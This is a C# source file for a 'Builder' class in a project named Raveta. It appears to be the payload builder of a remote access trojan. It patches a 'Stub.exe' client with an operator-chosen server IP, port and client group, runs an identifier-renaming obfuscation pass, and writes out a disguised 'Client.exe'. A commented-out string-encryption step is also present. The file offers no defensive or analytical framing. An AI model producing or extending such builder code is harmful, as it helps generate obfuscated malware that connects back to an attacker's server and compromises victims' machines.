using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Server.RenamingObfuscation;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;

namespace Raveta
{
    public struct BuilderData
    {
        public string IP;
        public string Port;
        public string Group;
    };

    public class Builder
    {
        public BuilderData builderData = new BuilderData();
        public void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {

            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    // Is the class name "Settings" ?
                    if (type.Name == "Settings")
                        // Every member of the class
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count; i++)
                            {
                                // Is the member a string?
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {

                                    if (method.Body.Instructions[i].Operand.ToString() == "%ServerIP%")
                                        method.Body.Instructions[i].Operand = builderData.IP;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%ServerPort%")
                                        method.Body.Instructions[i].Operand = builderData.Port;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%ClientGroup%")
                                        method.Body.Instructions[i].Operand = builderData.Group;

                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings: " + ex.Message);
            }
        }
        public async void Build()
        {
            DateTime dt = DateTime.Now;
            string time = "[" + dt.ToString("HH:mm:ss") + "] ";

            IPAddress ip;
            bool ValidIP = IPAddress.TryParse(builderData.IP, out ip);
            if (!ValidIP)
            {
                System.Windows.MessageBox.Show("Please type in a valid IP");
                return;
            }
            if (builderData.Port.Length < 1)
            {
                System.Windows.MessageBox.Show("Please type in a valid port");
                return;
            }


            ModuleDefMD asmDef = null;
            try
            {
                using (asmDef = ModuleDefMD.Load(@"Stub.exe"))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = System.Windows.Forms.Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = false;
                    saveFileDialog1.FileName = "Client";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        //btnBuild.Enabled = false;
                        WriteSettings(asmDef, saveFileDialog1.FileName);

                        //EncryptString.DoEncrypt(asmDef);
                        await Task.Run(() =>
                        {
                            Renaming.DoRenaming(asmDef);
                        });

                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();
                    }
                }
                System.Windows.MessageBox.Show("Client successfully built.");
            }
            catch (Exception ex)
            {
                System.Windows.MessageBox.Show(ex.Message);
                asmDef?.Dispose();
                // btnBuild.Enabled = true;

            }
        }

    }
}
